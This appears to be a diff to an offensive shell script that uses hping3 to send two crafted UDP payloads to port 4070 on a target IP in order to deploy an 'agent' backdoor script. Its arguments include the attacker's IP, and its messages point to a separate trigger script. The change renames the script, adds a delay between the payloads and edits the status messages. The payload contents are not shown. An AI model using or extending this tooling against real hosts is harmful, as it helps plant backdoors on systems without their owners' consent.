@@ -29,8 +29,8 @@ CMDEXEC=`which hping3`
 EXPECTED_ARGS=3;
 if [ $# -ne $EXPECTED_ARGS ]
 then
-	echo "Usage: ./deploy.sh <target ip> <target mac> <attackerip>"
-  echo "Example: ./deploy.sh 10.0.0.1 00:11:22:33:44:55"
+	echo "Usage: ./agentdeploy.sh <target ip> <target mac> <attackerip>"
+  echo "Example: ./agentdeploy.sh 10.0.0.1 00:11:22:33:44:55"
 	exit 1
 fi
 
@@ -50,11 +50,12 @@ echo "[*] Data files created"
 echo "[*] Executing"
 echo "[*] Sending Payload 1"
 ${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 $1 2> /dev/null
+sleep 5
 echo ""
 
 echo "[*] Sending Payload 2"
 ${CMDEXEC} -2 -p 4070 -c 1 -E data2.txt -d 150 $1 2> /dev/null
 echo ""
 cd ../
-echo "[*] 'agent' Script Deployed."
-echo "[*] Use door.sh to trigger the agent script."
+echo "[*] 'agent' script deployed to $1"
+echo "[*] Use triggeragent.sh to trigger the agent script."
